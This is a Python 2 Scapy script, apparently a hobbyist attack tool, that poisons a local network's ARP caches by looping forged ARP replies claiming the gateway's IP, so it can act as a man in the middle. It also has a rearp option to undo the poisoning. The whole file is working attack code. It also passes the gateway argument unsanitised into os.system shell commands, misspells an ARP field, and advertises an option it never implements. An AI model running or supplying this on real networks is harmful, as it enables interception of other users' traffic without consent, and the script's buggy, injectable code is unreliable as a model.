#!/usr/bin/python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time
import os
import re
import sys


def main():

	#Checks for sane arguments
		if len(sys.argv) < 2:
			print "Invalid Arguments"
			exit()

		#Help menu
		elif sys.argv[1] == "-h" or sys.argv[1] == "--help":
			print "\nARPMITM courtesy of r00t0v3rr1d3 \n"
			print "Usage: python arpmitm.py [OPTIONS] gateway\n"
			print "HELP MENU:"
			print "   -s,--specific 	only poision specific hosts"
			print "   -r,--rearp			Properly rearp network - gateway IP still required"
			print "   -h,--help 			display this message"

		elif sys.argv[1] == "-r" or sys.argv[1] == "--rearp":
			print 'Re-arping the network, removing man-in-the-middle...\n'
			rearp(sys.argv[2])
		elif len(sys.argv) < 3:
			print "Poisoning the entire subnet...\n"
			poisonall(sys.argv[1])

def poisonall(gateway):
	os.system("arp " + gateway + " > " + os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt")
	f = open(os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt", 'r')
	temp = f.readline()
	temp = f.readline()
	mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", temp).groups()[0]
	os.system("echo " + mac + " > " + os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt")
	time.sleep(.5)
	packet = ARP()
	packet.op = 2
	packet.psrc = gateway
	packet.hwdsk = 'ff:ff:ff:ff:ff:ff'
	temp2 = gateway.rpartition(".")
	random = temp2[0]
	random = random + ".37"
	packet.pdst = random
	time.sleep(2)
	while 1:
		send(packet, verbose=0)
		time.sleep(2)
		send(packet, verbose=0)

def rearp(gateway):
	packet = ARP()
	packet.op = 2
	f = open(os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt", 'r')
	mac = f.readline()
	macaddr = mac.rstrip("\n")
	packet.hwsrc = macaddr
	packet.psrc = gateway
	packet.hwdsk = 'ff:ff:ff:ff:ff:ff'
	temp2 = gateway.rpartition(".")
	random = temp2[0]
	random = random + ".37" #random ip  - required
	packet.pdst = random
	for i in range(0,5):
	   send(packet, verbose=0)
	   time.sleep(1)
	   send(packet, verbose=0)

if __name__ == '__main__':
			 main()
